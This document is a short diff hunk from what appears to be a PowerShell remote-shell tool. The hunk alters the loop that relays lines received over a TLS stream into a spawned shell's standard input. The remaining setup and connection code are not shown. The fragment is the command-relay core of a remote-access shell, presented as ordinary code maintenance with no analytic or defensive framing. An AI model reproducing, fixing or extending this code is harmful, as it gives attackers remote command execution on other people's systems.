@@ -19,8 +19,5 @@ $stderr = $shell.standarderror
 $stdin = $shell.standardinput
 while(($shell.hasexited -eq $false))
 {
-	while($stdout.endofstream -eq $false)
-	{
-		$stdin.writeline($tlsstreamreader.readline())
-	}
+	$stdin.writeline($tlsstreamreader.readline())
 }
